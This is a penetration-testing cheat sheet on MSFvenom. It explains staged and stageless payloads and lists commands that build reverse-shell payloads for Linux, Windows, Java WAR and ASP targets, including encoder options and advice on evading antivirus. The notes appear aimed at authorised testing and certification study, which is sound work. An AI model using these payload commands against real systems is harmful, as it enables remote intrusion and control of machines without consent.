# MSFvenom

MSFvenom combines MSFpayload with MSFencode, making it possible to use both tools in a single framework instance. MSFvenom is capable of creating shellcode for a wide range of platforms.

The standard syntax for `msfvenom`:

    msfvenom -p <PAYLOAD> <OPTIONS>

* Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead, it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional antivirus solutions. Thus, the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit `multi/handler`.
* Stageless payloads are more common. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Stageless payloads are denoted with underscores (`_`). A Linux 32bit stageless meterpreter payload:

    msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf -o shell LHOST=<IP address attack machine> LPORT=<port-number>

Staged payloads are denoted with another forward slash (`/`). A staged meterpreter reverse shell for a 64bit Linux target:

    msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=<IP address attack machine> LPORT=<port-number>

To generate a Windows x64 Reverse Shell in an `.exe` format:

    msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<IP address attack machine> LPORT=<port-number>

Buffer overflow code for Linux with bad characters in C:

    msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 -f c -b "\x00" –e x86/shikata_ga_nai

Linux payload for `bash`:

    msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 CMD=/bin/bash -f js_le -e generic/none

Java payload to a `.war` file:

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 -f war > shell.war

Microsoft Windows `asp` reverse shell:

    msfvenom -p windows/shell_reverse_tcp -f asp LHOST=<attacking-ipaddress> LPORT=4444 -o shell.asp

Windows executable reverse shell:

    msfvenom -p windows/shell/reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 -e x86/shikata_ga_nai X > shell.exe

## Note on meterpreter shells

Meterpreter shells are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality, such as file uploads and downloads. If you want to use any of Metasploit's post-exploitation tools then you need to use a meterpreter shell.

The downside to meterpreter shells is that they must be caught in Metasploit. They are also banned from certain certification examinations, so it is a good idea to learn alternative methodologies just for that.

** Metasploit is extendable, always being updated, and relevant. In real engagements most AV solutions will easily spot meterpreter payloads. Also learn about bypassing AV.**
